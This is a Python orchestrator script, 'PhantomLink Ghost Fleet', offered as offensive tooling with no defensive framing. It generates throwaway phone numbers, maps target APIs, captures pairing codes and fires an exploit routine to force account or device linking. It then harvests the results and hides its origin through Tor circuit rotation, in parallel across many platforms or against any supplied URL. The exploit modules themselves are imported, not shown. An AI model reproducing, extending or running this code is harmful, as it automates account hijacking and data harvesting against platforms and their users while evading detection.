"""PhantomLink Phase 8 — Ghost Fleet Multi-Platform Orchestrator"""
import asyncio
import hashlib
from datetime import datetime
from phantom.platforms import get_platform, fingerprint_platform, list_platforms
from phantom.number_gen import generate_ghost_number
from phantom.recon import map_target
from phantom.engager import capture_pairing_code
from phantom.exploit import trigger_link_success
from phantom.intel_sink import harvest_and_clean
from phantom.tor_rotator import ensure_tor_running, rotate_circuit

async def engage_single(platform_key: str, cycle_num: int = 1) -> dict:
    """Engage a single platform with a ghost number."""
    platform = get_platform(platform_key)
    op_id = hashlib.sha256(f"{platform_key}{datetime.utcnow().isoformat()}{cycle_num}".encode()).hexdigest()[:8]
    print(f"\n[GhostFleet:{op_id}] {platform.name} | Cycle {cycle_num}")
    
    ghost_number, country = generate_ghost_number()
    placeholders = {"op_id": op_id, "platform": platform_key, "ghost": ghost_number,
                    "country": country, "status": "init"}
    
    try:
        api_map = map_target(platform.url)
        api_map["target_url"] = platform.url
        if not api_map.get("confirm_url") and platform.confirm_endpoint:
            api_map["confirm_url"] = platform.confirm_endpoint
        
        pairing_code = await capture_pairing_code(platform.url, ghost_number)
        if not pairing_code or "FAKECODE" in pairing_code:
            placeholders["status"] = "no_code_captured"
            return placeholders
        
        result = await trigger_link_success(api_map, pairing_code, ghost_number)
        placeholders["status"] = result.get("status", "unknown")
        placeholders["vector"] = result.get("vector_used")
        placeholders["code"] = pairing_code
        harvest_and_clean(ghost_number, result, op_id, platform_key)
    except Exception as e:
        placeholders["status"] = "error"
        placeholders["error"] = str(e)
    
    return placeholders

async def engage_custom(url: str, cycle_num: int = 1) -> dict:
    """Engage an arbitrary URL via auto-fingerprinting."""
    platform = fingerprint_platform(url)
    op_id = hashlib.sha256(f"{url}{datetime.utcnow().isoformat()}{cycle_num}".encode()).hexdigest()[:8]
    print(f"\n[GhostFleet:{op_id}] Unknown platform at {url} | Cycle {cycle_num}")
    
    ghost_number, country = generate_ghost_number()
    placeholders = {"op_id": op_id, "platform": "custom", "url": url,
                    "ghost": ghost_number, "country": country, "status": "init"}
    
    try:
        api_map = map_target(url)
        api_map["target_url"] = url
        if not api_map.get("confirm_url") and platform.confirm_endpoint:
            api_map["confirm_url"] = platform.confirm_endpoint
        
        pairing_code = await capture_pairing_code(url, ghost_number)
        if not pairing_code or "FAKECODE" in pairing_code:
            placeholders["status"] = "no_code_captured"
            return placeholders
        
        result = await trigger_link_success(api_map, pairing_code, ghost_number)
        placeholders["status"] = result.get("status", "unknown")
        placeholders["vector"] = result.get("vector_used")
        placeholders["code"] = pairing_code
        harvest_and_clean(ghost_number, result, op_id, "custom")
    except Exception as e:
        placeholders["status"] = "error"
        placeholders["error"] = str(e)
    
    return placeholders

async def launch_fleet(platforms: list, cycles_per: int = 2, parallel: bool = True):
    """Launch Ghost Fleet against multiple platforms."""
    print("=" * 60)
    print("  PhantomLink Ghost Fleet — Multi-Platform Engagement")
    print("=" * 60)
    ensure_tor_running()
    
    all_results = []
    
    if parallel:
        # Parallel engagement — all platforms simultaneously
        tasks = []
        for p in platforms:
            for c in range(1, cycles_per + 1):
                tasks.append(engage_single(p, c))
        all_results = await asyncio.gather(*tasks, return_exceptions=True)
    else:
        # Sequential engagement — one platform at a time
        for p in platforms:
            for c in range(1, cycles_per + 1):
                rotate_circuit()
                result = await engage_single(p, c)
                all_results.append(result)
                await asyncio.sleep(5)
    
    print("\n" + "=" * 60)
    print("  GHOST FLEET RESULTS")
    print("=" * 60)
    success_count = sum(1 for r in all_results if isinstance(r, dict) and r.get("status") == "linked")
    platform_stats = {}
    for r in all_results:
        if isinstance(r, dict):
            p = r.get("platform", "unknown")
            platform_stats.setdefault(p, {"total": 0, "success": 0})
            platform_stats[p]["total"] += 1
            if r.get("status") == "linked":
                platform_stats[p]["success"] += 1
    for p, stats in platform_stats.items():
        print(f"  {p:15s}: {stats['success']}/{stats['total']} linked")
    print(f"\n  TOTAL: {success_count}/{len(all_results)} linked across {len(platform_stats)} platforms")
    return all_results

async def main():
    import argparse, sys
    parser = argparse.ArgumentParser(description="PhantomLink Ghost Fleet")
    parser.add_argument("--platforms", "-p", nargs="+", default=["zapero"],
                        help="Platform keys to engage")
    parser.add_argument("--cycles", "-c", type=int, default=1)
    parser.add_argument("--sequential", action="store_true", help="Run sequentially (not parallel)")
    parser.add_argument("--list", action="store_true", help="List known platforms")
    parser.add_argument("--custom", type=str, help="Engage a custom URL")
    args = parser.parse_args()
    
    if args.list:
        list_platforms()
        return
    
    if args.custom:
        result = await engage_custom(args.custom, args.cycles)
        print(result)
        return
    
    await launch_fleet(args.platforms, args.cycles, parallel=not args.sequential)

if __name__ == "__main__":
    asyncio.run(main())
